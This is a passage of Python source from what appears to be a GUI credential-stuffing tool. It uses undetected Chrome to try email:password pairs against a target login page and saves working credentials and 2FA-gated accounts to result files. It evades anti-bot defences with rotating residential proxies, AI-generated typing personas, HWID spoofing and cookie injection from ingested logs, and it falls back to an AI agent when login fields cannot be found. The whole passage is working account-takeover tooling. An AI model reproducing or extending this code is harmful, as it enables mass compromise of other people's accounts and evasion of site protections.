                    print_action(f"{Fore.CYAN}[Account] Standard password locator failed. Trying fast heuristic...{Style.RESET_ALL}")
                    password_field = _fast_heuristic_find_element(browser, "password")
                # ── Tier 3: AI agent fallback (30-60s) ──
                if password_field is None:
                    print_action(f"{Fore.YELLOW}[Account] Heuristic also failed. Triggering AI self-discovery fallback...{Style.RESET_ALL}")
                    success = _ai_self_discover_and_interact(browser, "password", password)
                    if not success:
                        print_action(f"{Fore.RED}[Account] AI self-discovery failed to fill password field. Aborting.{Style.RESET_ALL}")
                        return
                else:
                    try:
                        password_field.clear()
                    except Exception as e:
                        import logging
                        logging.debug(f"Failed to clear password field (may be read-only): {e}")
                    if stealth_settings and stealth_settings.get("jitter") and 'HumanJitter' in globals():
                        HumanJitter.human_typing(password, password_field)
                    else:
                        password_field.send_keys(password)
                    
            elif field_id == "css_selector_next_button_password":
                next_pwd_sel = capture_settings["css_selectors"].get("next_password")
                print_action("Locating and clicking Second Next button (after Password)...")
                next_pwd_button = _safe_find_element(browser, By.CSS_SELECTOR, next_pwd_sel, timeout=5, description="second next button") if next_pwd_sel else None
                # ── Tier 2: Fast heuristic fallback (<2s) ──
                if next_pwd_button is None:
                    print_action(f"{Fore.CYAN}[Account] Standard Second Next locator failed. Trying fast heuristic...{Style.RESET_ALL}")
                    next_pwd_button = _fast_heuristic_find_element(browser, "next")
                if next_pwd_button is not None:
                    try:
                        browser.execute_script("arguments[0].scrollIntoView(true);", next_pwd_button)
                        next_pwd_button.click()
                    except ElementClickInterceptedException:
                        browser.execute_script("arguments[0].click();", next_pwd_button)
                    except Exception as e:
                        print_action(f"{Fore.YELLOW}Second Next button click failed: {e}. Trying AI fallback...{Style.RESET_ALL}")
                        _ai_self_discover_and_interact(browser, "next")
                else:
                    # ── Tier 3: AI agent fallback ──
                    print_action(f"{Fore.YELLOW}[Account] Heuristic also failed for Second Next. Triggering AI fallback...{Style.RESET_ALL}")
                    _ai_self_discover_and_interact(browser, "next")
                    
                delay = 15 / (float(capture_settings.get("speed_percentage", 500)) + 1)
                countdown_sleep(delay)
                
            elif field_id == "sleep_submit":
                dur = float(sleep_durations.get("sleep_submit", 25))
                print_action(f"Sleeping for {dur} seconds before Submit button...")
                time.sleep(dur)
                
            elif field_id == "css_selector_submit":
                print_action("Locating and clicking Submit button...")
                sub_sel = capture_settings["css_selectors"]["submit"]
                submit_button = _safe_find_element(browser, By.CSS_SELECTOR, sub_sel, timeout=5, description="submit button") if sub_sel else None
                # ── Tier 2: Fast heuristic fallback (<2s) ──
                if submit_button is None:
                    print_action(f"{Fore.CYAN}[Account] Standard Submit locator failed. Trying fast heuristic...{Style.RESET_ALL}")
                    submit_button = _fast_heuristic_find_element(browser, "submit")
                if submit_button is not None:
                    try:
                        browser.execute_script("arguments[0].scrollIntoView(true);", submit_button)
                        submit_button.click()
                    except ElementClickInterceptedException:
                        print_action(f"{Fore.RED}Submit button click intercepted, clicking via script.{Style.RESET_ALL}")
                        browser.execute_script("arguments[0].click();", submit_button)
                    except Exception as e:
                        print_action(f"{Fore.YELLOW}Submit button click failed: {e}. Trying AI fallback...{Style.RESET_ALL}")
                        _ai_self_discover_and_interact(browser, "submit")
                else:
                    # ── Tier 3: AI agent fallback ──
                    print_action(f"{Fore.YELLOW}[Account] Heuristic also failed for Submit. Triggering AI fallback...{Style.RESET_ALL}")
                    success = _ai_self_discover_and_interact(browser, "submit")
                    if not success:
                        print_action(f"{Fore.RED}[Account] AI self-discovery failed to click submit. Aborting.{Style.RESET_ALL}")
                        return
        
                delay = 150 / (float(capture_settings.get("speed_percentage", 500)) + 1)
                countdown_sleep(delay)
                print_checkpoint(delay)
                
            elif field_type == "custom_text":
                sel = field.get("selector", "")
                val = field.get("value", "")
                resolved_val = val.replace("{email}", email).replace("{password}", password)
                if sel and val:
                    print_action(f"[Custom] Locating field '{sel}' to type '{resolved_val}'...")
                    field_el = _safe_find_element(browser, By.CSS_SELECTOR, sel, timeout=15)
                    if field_el:
                        try:
                            field_el.clear()
                        except Exception:
                            pass
                        field_el.send_keys(resolved_val)
                        
            elif field_type == "custom_click":
                sel = field.get("selector", "")
                if sel:
                    print_action(f"[Custom] Locating and clicking element '{sel}'...")
                    btn_el = _safe_find_element(browser, By.CSS_SELECTOR, sel, timeout=15)
                    if btn_el:
                        try:
                            btn_el.click()
                        except Exception:
                            browser.execute_script("arguments[0].click();", btn_el)
                            
            elif field_type == "custom_sleep":
                try:
                    dur = float(field.get("value", 5))
                except Exception:
                    dur = 5
                print_action(f"[Custom] Sleeping for {dur} seconds...")
                time.sleep(dur)
 
        time.sleep(2)
        
        # ── Fast heuristic error detection (Tier 2) ── scans for errors in <2s
        # Try heuristic first, only fall back to slow AI if no error was detected AND discovery is needed
        invalid_detected = _fast_heuristic_detect_error(
            browser, "invalid_credentials",
            invalid_account_settings=invalid_account_settings,
            captcha_wrong_settings=captcha_wrong_settings
        )
        captcha_detected = _fast_heuristic_detect_error(
            browser, "captcha_error",
            invalid_account_settings=invalid_account_settings,
            captcha_wrong_settings=captcha_wrong_settings
        )
        # Only trigger slow AI if neither error was found AND error detection is enabled
        if not invalid_detected and not captcha_detected:
            if invalid_account_settings["enable"] or captcha_wrong_settings["enable"]:
                if not invalid_account_settings.get("error_alert_css_selector") and not captcha_wrong_settings.get("error_alert_css_selector"):
                    _ai_self_discover_and_interact(browser, "errors")


        time.sleep(2)

        # Handle Invalid Account Implementation
        if invalid_account_settings["enable"]:
            print_action("Handling Invalid Account Check...")
            invalid_marked = False

            if invalid_account_settings["redirect_detection"]:
                target_url = invalid_account_settings["redirect_detection"]
                if target_url and browser.current_url == target_url:
                    print_action(
                        f"{Fore.RED}Account marked as invalid due to redirect to {target_url}.{Style.RESET_ALL}"
                    )
                    invalid_marked = True

            if (
                not invalid_marked
                and invalid_account_settings["error_alert_css_selector"]
            ):
                try:
                    error_element = _safe_find_element(
                        browser,
                        By.CSS_SELECTOR,
                        invalid_account_settings["error_alert_css_selector"],
                        timeout=10,
                        description="invalid account error alert"
                    )
                    if error_element:
                        print_action(
                            f"{Fore.RED}Account marked as invalid due to error alert detected.{Style.RESET_ALL}"
                        )
                        invalid_marked = True

                except Exception as e:
                    print_action(f"{Fore.YELLOW}Error locating invalid alert: {type(e).__name__}{Style.RESET_ALL}")

            if not invalid_marked and invalid_account_settings["inner_html"]:
                if _check_text_in_all_frames(browser, invalid_account_settings["inner_html"]):
                    print_action(
                        f"{Fore.RED}Account marked as invalid due to inner HTML match.{Style.RESET_ALL}"
                    )
                    invalid_marked = True

            if not invalid_marked and invalid_account_settings["outer_html"]:
                if _check_outer_html_in_all_frames(browser, invalid_account_settings["outer_html"]):
                    print_action(
                        f"{Fore.RED}Account marked as invalid due to outer HTML match.{Style.RESET_ALL}"
                    )
                    invalid_marked = True

            if invalid_marked:
                mark_account_checked(email, password, db_name)
                with open(
                    os.path.join(results_folder, "invalid_accounts.txt"), "a", encoding='utf-8'
                ) as f:
                    f.write(f"{email}:{password}\n")

                return  # Skip remaining checks

        # Handle CAPTCHA Input Wrong Implementation
        if captcha_wrong_settings["enable"]:
            print_action("Handling CAPTCHA Wrong Check...")
            captcha_marked = False

            if captcha_wrong_settings["redirect_detection"]:
                if (
                    captcha_wrong_settings["redirect_detection"]
                    in browser.current_url
                ):
                    print_action(
                        f"{Fore.RED}CAPTCHA triggered according to redirect match.{Style.RESET_ALL}"
                    )
                    captcha_marked = True

            if (
                not captcha_marked
                and captcha_wrong_settings["error_alert_css_selector"]
            ):
                try:
                    error_element = _safe_find_element(
                        browser,
                        By.CSS_SELECTOR,
                        captcha_wrong_settings["error_alert_css_selector"],
                        timeout=10,
                        description="captcha wrong error alert"
                    )
                    if error_element:
                        print_action(
                            f"{Fore.RED}CAPTCHA triggered according to error alert detection.{Style.RESET_ALL}"
                        )
                        captcha_marked = True
                except Exception as e:
                    print_action(f"{Fore.YELLOW}Error locating captcha alert: {type(e).__name__}{Style.RESET_ALL}")

            if not captcha_marked and captcha_wrong_settings["inner_html"]:
                if _check_text_in_all_frames(browser, captcha_wrong_settings["inner_html"]):
                    print_action(
                        f"{Fore.RED}CAPTCHA triggered according to inner HTML match.{Style.RESET_ALL}"
                    )
                    captcha_marked = True

            if not captcha_marked and captcha_wrong_settings["outer_html"]:
                if _check_outer_html_in_all_frames(browser, captcha_wrong_settings["outer_html"]):
                    print_action(
                        f"{Fore.RED}CAPTCHA triggered according to outer HTML match.{Style.RESET_ALL}"
                    )
                    captcha_marked = True

            if captcha_marked:
                # Re-check the same account
                print_action(
                    f"{Fore.YELLOW}Re-checking the same account due to wrong captcha.{Style.RESET_ALL}"
                )
                check_account(
                    account,
                    browser,
                    website_link,
                    valid_link,
                    db_name,
                    custom_valid_link,
                    results_folder,
                    capture_settings,
                    sleep_durations,
                    invalid_account_settings,
                    captcha_wrong_settings,
                )

                return  # Exit current function after re-check

        print_action("Checking for valid link...")
        # Check for valid link with wildcard matching

        account_valid = False

        if custom_valid_link:
            # Split the custom valid link at the '*'
            valid_prefix = custom_valid_link.split("*")[0]
            if browser.current_url.startswith(valid_prefix):
                print_action(
                    f"{Fore.GREEN}Valid Account Found (custom): {email}:{password}{Style.RESET_ALL}"
                )
                account_valid = True
                mark_account_checked(email, password, db_name)
                with open(os.path.join(results_folder, "custom.txt"), "a", encoding='utf-8') as f:
                    f.write(f"{email}:{password}\n")
                save_valid_account(email, password, results_folder, browser, capture_settings)

        # --- 2FA / REDIRECT DETECTION LOGIC ---
        tfa_link = capture_settings.get("2fa_link")
        if not account_valid and tfa_link:
            tfa_prefix = tfa_link.split("*")[0]
            if browser.current_url.startswith(tfa_prefix):
                print_action(f"{Fore.YELLOW}2FA/Verification Detected! Waiting for resolution...{Style.RESET_ALL}")
                with open(os.path.join(results_folder, "2fa_required.txt"), "a", encoding='utf-8') as f:
                    f.write(f"{email}:{password}\n")
                save_valid_account(email, password, results_folder, browser, capture_settings)
        # ----------------------------------------

        if not account_valid and valid_link:
            # Split the valid link at the '*'
            valid_prefix = valid_link.split("*")[0]
            if browser.current_url.startswith(valid_prefix):
                print_action(
                    f"{Fore.GREEN}Valid Account Found: {email}:{password}{Style.RESET_ALL}"
                )
                account_valid = True

                mark_account_checked(email, password, db_name)

                with open(os.path.join(results_folder, "valid.txt"), "a", encoding='utf-8') as f:
                    f.write(f"{email}:{password}\n")

                save_valid_account(
                    email, password, results_folder, browser, capture_settings
                )

        if account_valid:
            # on_success lifecycle hook
            trigger_lifecycle_hook("on_success", {
                "browser": browser,
                "email": email,
                "password": password,
                "capture_settings": capture_settings
            })
        else:
            # on_failure lifecycle hook
            trigger_lifecycle_hook("on_failure", {
                "browser": browser,
                "email": email,
                "password": password,
                "capture_settings": capture_settings
            })

        if not account_valid:
            print_action(
                f"{Fore.RED}Invalid Account: {email}:{password}{Style.RESET_ALL}"
            )

        # Handle Redirect Link if provided
        redirect_link = capture_settings.get("redirect_link")

        if account_valid and redirect_link:
            print_action(f"Redirecting to {redirect_link} after 5 seconds...")
            time.sleep(5)

            try:
                browser.get(redirect_link)
                print_action(f"Redirected to {redirect_link} successfully.")
                # Capture details again if necessary
                save_valid_account(
                    email, password, results_folder, browser, capture_settings
                )
            except Exception as e:
                print_action(
                    f"{Fore.RED}Failed to redirect to {redirect_link}: {e}{Style.RESET_ALL}"
                )

    except Exception as e:
        print_action(
            f"{Fore.RED}Error checking account {email}: {e}{Style.RESET_ALL}"
        )
        # on_error lifecycle hook
        trigger_lifecycle_hook("on_error", {
            "browser": browser,
            "email": email,
            "password": password,
            "capture_settings": capture_settings
        })

    finally:
        # Perform browser clean-up if enabled
        if capture_settings.get("cleanup_enabled", True):
            try:
                print_action("Performing browser clean-up...")
                browser.delete_all_cookies()
                browser.execute_cdp_cmd("Network.clearBrowserCache", {})
                browser.execute_script("window.localStorage.clear();")
                browser.execute_script("window.sessionStorage.clear();")
                print_action("Browser clean-up completed.")
            except Exception as e:
                print_action(
                    f"{Fore.RED}Error during browser clean-up: {e}{Style.RESET_ALL}"
                )


def check_accounts_logic(
    accounts,
    website_link,
    valid_link,
    db_name,
    custom_valid_link,
    results_folder,
    user_data_dir,
    profile_name,
    capture_settings,
    sleep_durations,
    proxy_enabled=False,
    proxy_type="HTTP",
    proxy_mode="Static Proxies",
    custom_user_agents=None,
    load_extensions=False,
    disable_notifications=False,
    disable_infobars=False,
    start_maximized=False,
    disable_extensions_option=False,
    headless=False,
    chromedriver_args=None,
    invalid_account_settings=None,
    captcha_wrong_settings=None,
    proxies=None,
    stealth_settings=None,
    dynamic_proxy_enabled=False,
    proxy_source_url="",
    proxy_fetch_interval=60,
):
    """Processes all accounts."""
    user_agent_index = 0  # Initialize user agent index
    # Keep the original base args immutable - we build a per-account snapshot each iteration
    base_chromedriver_args = list(chromedriver_args) if chromedriver_args else []
    # Round-robin proxy index for sequential per-account proxy assignment
    proxy_index = 0
    global browser, mouse_clicks, css_clicks
    _sweeper_stop = None  # CDP tab sweeper stop event (initialized per-account)

    proxy_worker = None
    if dynamic_proxy_enabled and proxy_source_url:
        try:
            proxy_worker = ProxySourceWorker(
                source_url=proxy_source_url,
                update_interval=proxy_fetch_interval,
                proxy_rotator_cls=ProxyRotator,
                proxy_mode=proxy_mode
            )
            proxy_worker.start()
            print_action(f"{Fore.CYAN}[Dynamic Proxy] Started ProxySourceWorker from {proxy_source_url} every {proxy_fetch_interval}s.{Style.RESET_ALL}")
        except Exception as e:
            print_action(f"{Fore.RED}[Dynamic Proxy] Failed to start ProxySourceWorker: {e}{Style.RESET_ALL}")

    try:
        from engine.kernel.math_engine.scheduler import EDFScheduler
        scheduler = EDFScheduler()
        
        # Define a function to process a single account
        def process_single_account(index, account):
            nonlocal user_agent_index, proxy_index
            global browser, mouse_clicks, css_clicks
            _sweeper_stop = None
            
            if stop_event.is_set():
                return
                
            while pause_event.is_set():
                print_action(
                    f"{Fore.YELLOW}Script is paused. Waiting to resume...{Style.RESET_ALL}"
                )
                time.sleep(1)
                if stop_event.is_set():
                    print_action(
                        f"{Fore.RED}Force Stop activated while paused. Stopping account checks.{Style.RESET_ALL}"
                    )
                    return

            email, password = account
            print_action(
                f"{Fore.CYAN}Checking account {index}/{len(accounts)}: {email}{Style.RESET_ALL}"
            )
            try:
                # Initialize browser if it doesn't exist or if we're not using the same session
                if not browser or not var_use_same_session.get():
                    selected_user_agent = None

                    if custom_user_agents:
                        selected_user_agent = random.choice(custom_user_agents)
                        user_agent_index += 1

                    # ----------------------------------------------------------------
                    # Build a FRESH per-account copy of args from the immutable base.
                    # This prevents proxy / debug-port args from accumulating across
                    # iterations (the root cause of Bug 1).
                    # ----------------------------------------------------------------
                    account_chromedriver_args = list(base_chromedriver_args)

                    if proxy_enabled:
                        proxy_argument = None
                        if 'apply_network_stealth' in globals() and (proxies or ProxyRotator.is_loaded()):
                            raw_list = proxies if proxies else ProxyRotator._proxies
                            valid_proxies = [
                                p for p in raw_list
                                if p and isinstance(p, str) and p.strip() and ':' in p
                            ]
                            if valid_proxies:
                                print_action(f"{Fore.CYAN}[Stealth] Validating residential proxies via network_stealth...{Style.RESET_ALL}")
                                selected_proxy = apply_network_stealth(None, valid_proxies)
                                if selected_proxy:
                                    proxy_argument = selected_proxy
                                    if not proxy_argument.startswith(('http://', 'https://', 'socks5://')):
                                        if proxy_type in ["HTTP", "HTTPS", "SOCKS5"]:
                                            proxy_argument = f"{proxy_type.lower()}://{proxy_argument}"
                                        else:
                                            proxy_argument = f"http://{proxy_argument}"
                                    print_action(f"{Fore.GREEN}[Stealth] Selected residential proxy: {proxy_argument}{Style.RESET_ALL}")
                                else:
                                    print_action(f"{Fore.RED}[Stealth] Proxy failed residential verification. Rotating...{Style.RESET_ALL}")

                        if not proxy_argument:
                            if ProxyRotator.is_loaded():
                                proxy_argument = ProxyRotator.get_next(proxy_type=proxy_type)
                            elif proxies:
                                # ProxyRotator not yet loaded - fall back to direct list (legacy path)
                                valid_proxies = [
                                    p for p in proxies
                                    if p and isinstance(p, str) and p.strip() and ':' in p
                                ]
                                if valid_proxies:
                                    if proxy_mode == "Static Proxies":
                                        proxy_raw = valid_proxies[proxy_index % len(valid_proxies)]
                                        proxy_index += 1
                                    elif proxy_mode == "Rotating Proxies":
                                        proxy_raw = random.choice(valid_proxies)
                                    else:
                                        proxy_raw = None

                                    if proxy_raw:
                                        proxy_clean = proxy_raw.strip()
                                        if '://' in proxy_clean:
                                            proxy_argument = proxy_clean
                                        else:
                                            if proxy_type in ["HTTP", "HTTPS", "SOCKS5"]:
                                                proxy_argument = f"{proxy_type.lower()}://{proxy_clean}"
                                            else:
                                                proxy_argument = f"http://{proxy_clean}"

                        if proxy_argument:
                            print_action(
                                f"{Fore.YELLOW}[Proxy] Account {email} → {proxy_argument}{Style.RESET_ALL}"
                            )
                            # Strip any stale --proxy-server= before injecting the fresh proxy
                            account_chromedriver_args = [
                                a for a in account_chromedriver_args
                                if not a.startswith('--proxy-server=')
                            ]
                            account_chromedriver_args.append(f"--proxy-server={proxy_argument}")
                        else:
                            print_action(
                                f"{Fore.YELLOW}[Proxy] Proxy enabled but no valid proxy resolved. Skipping proxy for {email}.{Style.RESET_ALL}"
                            )

                    # STEALTH INJECTION: Per-Session Linguistic Chameleon Persona Regeneration
                    if stealth_settings and stealth_settings.get("jitter") and stealth_settings.get("openrouter_keys") and 'HumanJitter' in globals():
                        try:
                            keys = stealth_settings["openrouter_keys"]
                            integration = _get_openrouter_integration(api_keys=keys)
                            if integration:
                                new_persona = integration.generate_stealth_persona_sync()
                                if new_persona:
                                    HumanJitter.set_persona(new_persona)
                                    print_action(f"{Fore.MAGENTA}[Stealth] Linguistic Chameleon active: persona='{new_persona.get('type')}' wpm={new_persona.get('wpm')} hesitation={new_persona.get('hesitation')}{Style.RESET_ALL}")
                        except Exception as pe:
                            print_action(f"{Fore.YELLOW}[Stealth] Persona generation failed (non-critical): {pe}{Style.RESET_ALL}")
                    if stealth_settings and stealth_settings.get("reinstall"):
                        print_action(f"{Fore.CYAN}[STEALTH] Initiating Kernel-Level Browser Purge...{Style.RESET_ALL}")
                        try:
                            if 'BrowserReinstaller' in globals():
                                BrowserReinstaller.full_purge()
                            if stealth_settings.get("hwid_spoof") and 'BrowserReinstaller' in globals():
                                BrowserReinstaller.rotate_hwid()
                        except Exception as he:
                            print_action(f"{Fore.RED}[STEALTH ERROR] Failed HWID/Purge: {he}{Style.RESET_ALL}")

                    # STEALTH INJECTION: Session Isolation Engine
                    current_user_data_dir = user_data_dir

                    effective_stealth = dict(stealth_settings) if stealth_settings else {}
                    if var_log_ingestion_enabled.get() and var_log_ingestion_isolate.get():
                        if not effective_stealth.get("isolation"):
                            print_action(f"{Fore.CYAN}[Log Ingestion] Auto-activating session isolation for per-account cookie isolation.{Style.RESET_ALL}")
                        effective_stealth["isolation"] = True

                    if effective_stealth and effective_stealth.get("isolation"):
                        try:
                            if 'SessionIsolationManager' in globals():
                                iso_manager = SessionIsolationManager()
                                sess_data = iso_manager.get_isolated_session(
                                    email,
                                    load_extensions=load_extensions,
                                    profile_directory=profile_name,
                                )
                                if sess_data:
                                    print_action(f"{Fore.CYAN}[STEALTH] Isolated Session created for {email} on port {sess_data['port']}{Style.RESET_ALL}")
                                    current_user_data_dir = sess_data['dir']
                                    account_chromedriver_args = [
                                        a for a in account_chromedriver_args
                                        if not a.startswith('--remote-debugging-port=')
                                        and not a.startswith('--load-extension=')
                                    ]
                                    account_chromedriver_args.append(f"--remote-debugging-port={sess_data['port']}")
                                    if load_extensions and sess_data.get('ext_arg'):
                                        account_chromedriver_args.append(sess_data['ext_arg'])
                                        print_action(f"{Fore.GREEN}[STEALTH] Extensions injected into isolated session for {email}.{Style.RESET_ALL}")
                                    elif load_extensions and not sess_data.get('ext_arg'):
                                        print_action(f"{Fore.YELLOW}[STEALTH] Load Extensions is ON but no unpacked extensions found in _ext_unpacked/. "
                                                     f"Run once without isolation first to unpack CRX files.{Style.RESET_ALL}")
                        except Exception as ie:
                            print_action(f"{Fore.RED}[STEALTH ERROR] Isolation Failed: {ie}{Style.RESET_ALL}")

                    browser = open_undetected_browser_with_options(
                        current_user_data_dir,
                        profile_name,
                        incognito_mode=capture_settings.get("incognito_mode", False),
                        user_agent=selected_user_agent,
                        load_extensions=load_extensions,
                        disable_notifications=disable_notifications,
                        disable_infobars=disable_infobars,
                        start_maximized=start_maximized,
                        disable_extensions_option=disable_extensions_option,
                        headless=headless,
                        chromedriver_args=account_chromedriver_args,
                        start_url=website_link,
                    )

                    if not browser:
                        print_action(
                            f"{Fore.RED}Failed to initialize browser for account {email}. Skipping...{Style.RESET_ALL}"
                        )
                        return

                    _sweeper_stop = _start_cdp_tab_sweeper(browser, website_link, interval=0.3)
                    if load_extensions and var_developer_mode.get():
                        try:
                            _current_url_before = browser.current_url
                            browser.get("chrome://extensions/")
                            import time as _t
                            _t.sleep(1.5)
                            _prune_extra_tabs(browser, website_link)
                            browser.execute_script("""
                                (function() {
                                    var mgr = document.querySelector('extensions-manager');
                                    if (!mgr) return;
                                    var toolbar = mgr.shadowRoot && mgr.shadowRoot.querySelector('extensions-toolbar');
                                    if (!toolbar || !toolbar.shadowRoot) return;
                                    var toggle = toolbar.shadowRoot.querySelector('#devMode, cr-toggle[id=devMode]');
                                    if (toggle && !toggle.checked) { toggle.click(); }
                                })();
                            """)
                            _t.sleep(0.8)
                            browser.get(_current_url_before if _current_url_before != 'data:,' else website_link)
                            _t.sleep(1.0)
                            _prune_extra_tabs(browser, website_link)
                            print_action(f"{Fore.GREEN}[Extensions] Developer Mode enabled in browser.{Style.RESET_ALL}")
                            _prune_extra_tabs(browser, website_link)
                        except Exception as _dme:
                            print_action(f"{Fore.YELLOW}[Extensions] Developer Mode toggle skipped: {_dme}{Style.RESET_ALL}")

                    _cookie_file_to_inject = None
                    if var_log_ingestion_enabled.get():
                        _per_account_cookie = get_cookie_path_for_account(email, password, db_name)
                        if _per_account_cookie:
                            _cookie_file_to_inject = _per_account_cookie
                            print_action(f"{Fore.CYAN}[Log Ingestion] Per-account cookie file resolved: {_cookie_file_to_inject}{Style.RESET_ALL}")
                        else:
                            _cookie_file_to_inject = effective_stealth.get("cookie_list_path", "").strip() or None
                            if _cookie_file_to_inject:
                                print_action(f"{Fore.YELLOW}[Log Ingestion] No per-account cookie in DB for {email}; using global cookie file.{Style.RESET_ALL}")
                    else:
                        _cookie_file_to_inject = (stealth_settings or {}).get("cookie_list_path", "").strip() or None
                        if not _cookie_file_to_inject:
                            _fallback = locator.get_absolute_path("config/tracking_cookies.json") if 'locator' in globals() else None
                            if _fallback and os.path.exists(_fallback):
                                _cookie_file_to_inject = _fallback

                    if _cookie_file_to_inject and os.path.exists(_cookie_file_to_inject):
                        _injected_count = _inject_cookies_cdp(browser, _cookie_file_to_inject)
                        print_action(f"{Fore.CYAN}[Stealth] {_injected_count} cookie(s) injected via CDP for {email}{Style.RESET_ALL}")
                    elif _cookie_file_to_inject:
                        print_action(f"{Fore.YELLOW}[Stealth] Cookie file path set but file not found: {_cookie_file_to_inject}{Style.RESET_ALL}")

                # Prepare mouse clicks if enabled
                mouse_clicks = []
                if var_enable_mouse_clicks.get():
                    for frame in mouse_click_frames:
                        x = frame["x_entry"].get().strip()
                        y = frame["y_entry"].get().strip()
                        num_clicks = frame["num_clicks_entry"].get().strip()
                        interval = frame["interval_entry"].get().strip()
                        if x and y and num_clicks and interval:
                            mouse_clicks.append((x, y, num_clicks, interval))
                        else:
                            print_action(
                                f"{Fore.YELLOW}Incomplete mouse click data; skipping this click action.{Style.RESET_ALL}"
                            )
                    css_clicks = []
                    for frame in css_click_frames:
                        selector = frame["selector_entry"].get().strip()
                        num_clicks = frame["num_clicks_entry"].get().strip()
                        interval = frame["interval_entry"].get().strip()
                        if selector and num_clicks and interval:
                            css_clicks.append((selector, num_clicks, interval))
                        else:
                            print_action(
                                f"{Fore.YELLOW}Incomplete CSS click data; skipping this CSS click action.{Style.RESET_ALL}"
                            )

                if browser and var_use_same_session.get():
                    try:
                        if _sweeper_stop:
                            _sweeper_stop.set()
                    except Exception:
                        pass
                    import time as _st_time
                    _st_time.sleep(0.1)
                    _sweeper_stop = _start_cdp_tab_sweeper(browser, website_link, interval=0.3)

                check_account(
                    account,
                    browser,
                    website_link,
                    valid_link,
                    db_name,
                    custom_valid_link,
                    results_folder,
                    capture_settings,
                    sleep_durations,
                    invalid_account_settings,
                    captcha_wrong_settings,
                    stealth_settings,
                )

            except Exception as e:
                print_action(
                    f"{Fore.RED}Unexpected error for account {email}: {e}{Style.RESET_ALL}"
                )

            finally:
                try:
                    if _sweeper_stop:
                        _sweeper_stop.set()
                except Exception:
                    pass
                _sweeper_stop = None
                if not var_use_same_session.get():
                    close_browser_instance()

                time.sleep(2)

        # Populate scheduler and track execution events
        execution_events = []
        for index, account in enumerate(accounts, start=1):
            email = account[0]
            # Premium/VIP accounts run first (relative_deadline = 1.0s, priority = 0)
            if "vip" in email.lower() or "premium" in email.lower():
                relative_deadline = 1.0
                priority = 0
                print_action(f"{Fore.GREEN}[EDF] Prioritized Premium/VIP Account '{email}' queued with high urgency.{Style.RESET_ALL}")
            else:
                relative_deadline = float(5.0 + (index * 5.0))
                priority = 10
                
            task_done_event = threading.Event()
            execution_events.append(task_done_event)
            
            def make_task_fn(idx, acc, ev):
                return lambda: process_single_account_task(idx, acc, ev)
                
            def process_single_account_task(idx, acc, ev):
                try:
                    process_single_account(idx, acc)
                finally:
                    ev.set()
                    
            scheduler.schedule(relative_deadline, f"account_{index}", make_task_fn(index, account, task_done_event), priority=priority)
            
        scheduler.start()
        
        # Wait for all scheduler tasks to set their completion events
        for ev in execution_events:
            while not ev.is_set():
                if stop_event.is_set():
                    scheduler.stop()
                    break
                ev.wait(timeout=1.0)
                
        scheduler.stop()

    finally:
        if proxy_worker:
            proxy_worker.stop()
            print_action(f"{Fore.CYAN}[Dynamic Proxy] Stopped ProxySourceWorker.{Style.RESET_ALL}")


def run_account_checks(
    usernames_and_passwords,
    website_target_link,
    website_valid_link,
    db_name,
    custom_valid_link,
    results_folder,
    user_data_dir,
    profile_name,
    capture_settings,
    sleep_durations,
    proxy_enabled,
    proxy_type,
    proxy_mode,
    custom_user_agents,
    load_extensions,
    disable_notifications,
    disable_infobars,
    start_maximized,
    disable_extensions_option,
    headless,
    chromedriver_args,
    invalid_account_settings,
    captcha_wrong_settings,
    proxies,
    stealth_settings=None,
    dynamic_proxy_enabled=False,
    proxy_source_url="",
    proxy_fetch_interval=60,
):
    """Runs the account checking process in a separate thread."""
    # Pre-warm 1: resolve and cache the chromedriver path BEFORE the first account
    # is processed.  This eliminates the 30-second network-resolution window that
    # would otherwise block account #1 from launching its browser.
    try:
        from engine.kernel.browser_factory import prewarm_chromedriver
        prewarm_chromedriver()
    except Exception as _pw_err:
        print_action(f"{Fore.YELLOW}[Prewarm] chromedriver pre-warm skipped: {_pw_err}{Style.RESET_ALL}")
    # Pre-warm 2: unpack all CRX files into _ext_unpacked/ BEFORE the account loop
    # starts.  This guarantees that _ext_unpacked/ is populated even when isolated
    # sessions are used first (SessionIsolationManager.get_extension_load_arg()
    # reads from _ext_unpacked/).  Without this step the very first isolated-session
    # run would find an empty _ext_unpacked/ and skip extensions entirely.
    if load_extensions:
        try:
            import undetected_chromedriver as _uc_prewarm
            _prewarm_opts = _uc_prewarm.ChromeOptions()
            load_chrome_extensions(_prewarm_opts)
            print_action(f"{Fore.GREEN}[Prewarm] Extensions pre-unpacked into _ext_unpacked/ for isolated sessions.{Style.RESET_ALL}")
        except Exception as _ext_pw_err:
            print_action(f"{Fore.YELLOW}[Prewarm] Extension pre-unpack skipped: {_ext_pw_err}{Style.RESET_ALL}")
    try:
        check_accounts_logic(
            usernames_and_passwords,
            website_target_link,
            website_valid_link,
            db_name,
            custom_valid_link,
            results_folder,
            user_data_dir,
            profile_name,
            capture_settings,
            sleep_durations,
            proxy_enabled,
            proxy_type,
            proxy_mode,
            custom_user_agents,
            load_extensions,
            disable_notifications,
            disable_infobars,
            start_maximized,
            disable_extensions_option,
            headless,
            chromedriver_args,
            invalid_account_settings,
            captcha_wrong_settings,
            proxies,  # Added proxies here
            stealth_settings,
            dynamic_proxy_enabled,
            proxy_source_url,
            proxy_fetch_interval,
        )

        messagebox.showinfo(
            "Process Completed", "Account checking process has completed."
        )

    except Exception as e:
        print_action(
            f"{Fore.RED}An error occurred during account checking: {e}{Style.RESET_ALL}"
        )
        messagebox.showerror("Error", f"An error occurred: {e}")

    finally:
        # Re-enable the Check Accounts button
        btn_check_accounts.config(state=tk.NORMAL)

        # Reset pause and stop events
        pause_event.clear()
        stop_event.clear()

        btn_pause_resume.config(text="Pause")
        btn_force_stop.config(state=tk.DISABLED)


# -------------------
# GUI Functions
# -------------------
entry_placeholders = {'Enter value here...', 'Enter redirect link here...', 'Enter argument here...'}


def get_entry_value(entry):
    value = entry.get().strip()
    if value in entry_placeholders:
        return ''
    else:
        return value


def gui_check_accounts():
    """Handles the Check Accounts button click."""
    website_target_link = get_entry_value(entry_website_target_link)
    website_valid_link = get_entry_value(entry_website_valid_link)
    redirect_url = get_entry_value(entry_redirect_link)
    custom_valid_link = redirect_url  # Use redirect URL as custom valid link if needed

    if not website_target_link:
        messagebox.showerror("Input Error", "Website Target Link is required.")
        return

    css_selectors = {
        "email": get_entry_value(entry_css_selector_email),
        "password": get_entry_value(entry_css_selector_password),
        "next_password": get_entry_value(entry_css_selector_next_button_password) or None,
        "submit": get_entry_value(entry_css_selector_submit),
        "next": get_entry_value(entry_css_selector_next_button) or None,
    }

    # Validate required CSS selectors
    if not css_selectors["email"] or not css_selectors["password"] or not css_selectors["submit"]:
